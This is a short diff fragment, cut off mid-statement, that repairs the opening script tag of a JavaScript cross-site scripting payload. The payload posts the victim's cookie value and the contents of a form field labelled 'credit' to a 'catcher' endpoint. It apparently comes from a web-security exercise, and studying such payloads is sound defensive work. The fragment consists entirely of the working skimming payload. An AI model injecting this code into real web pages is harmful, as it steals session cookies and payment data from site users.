@@ -1,4 +1,4 @@
-script>
+<script>
     $.ajax({
         type: "POST",
         url: "catcher?PROPERTY=yes&cookie=" + document.cookie.split("=")[1] + "&credit=" + document.getElementsByName("field2")[0].value.replace(/\s+/g, '-'),
